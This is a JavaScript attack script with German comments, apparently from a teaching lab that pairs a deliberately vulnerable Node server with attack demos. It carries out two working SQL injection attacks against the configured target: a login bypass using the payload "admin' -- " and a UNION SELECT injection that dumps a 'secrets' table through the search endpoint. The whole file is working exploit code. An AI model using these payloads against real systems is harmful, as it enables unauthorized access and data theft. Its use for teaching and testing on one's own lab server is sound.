// =====================================================================
//  ANGRIFF 2.1 – VERTRAULICHKEIT   (Referenz-Implementierung)
// =====================================================================
//  Ziel: Daten lesen, die man nicht lesen dürfte.
//  Zwei Varianten gegen den verwundbaren Server:
//    (A) Login-Bypass  -> Anmeldung ohne gültiges Passwort
//    (B) UNION-Injection -> Auslesen der geheimen "secrets"-Tabelle
//
//  Voraussetzung: der verwundbare Server läuft (npm run start:vulnerable).
//  Aufruf:        npm run attack:confidentiality
// =====================================================================

const BASE_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000';

async function loginBypass() {
  console.log('\n=== (A) Login-Bypass ===');

  // Der Kommentar "-- " schneidet die Passwortprüfung ab.
  const payload = { username: "admin' -- ", password: 'egal' };
  console.log('Payload:', JSON.stringify(payload));

  const res = await fetch(`${BASE_URL}/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  const data = await res.json();

  if (data.ok) {
    console.log('ERFOLG: als Admin eingeloggt, ohne dessen Passwort zu kennen.');
    console.log('Erhaltene Datensätze:', data.users);
  } else {
    console.log('Angriff nicht erfolgreich:', data.message);
  }
}

async function unionRead() {
  console.log('\n=== (B) UNION-Injection: geheime Tabelle auslesen ===');

  // Die Basisabfrage liefert 3 Spalten (id, username, email).
  // Mit UNION hängen wir die Spalten der secrets-Tabelle an.
  const term = "zzz' UNION SELECT id, label, content FROM secrets -- ";
  console.log('Payload (term):', term);

  const res = await fetch(`${BASE_URL}/search?term=${encodeURIComponent(term)}`);
  const data = await res.json();

  console.log('ERFOLG: Inhalt der secrets-Tabelle über die User-Suche geleakt:');
  for (const row of data.results) {
    console.log(`  #${row.id}  ${row.username}  ->  ${row.email}`);
  }
}

async function main() {
  try {
    await loginBypass();
    await unionRead();
  } catch (err) {
    console.error('Fehler beim Angriff:', err.message);
    console.error('Läuft der verwundbare Server? (npm run start:vulnerable)');
    process.exit(1);
  }
}

main();
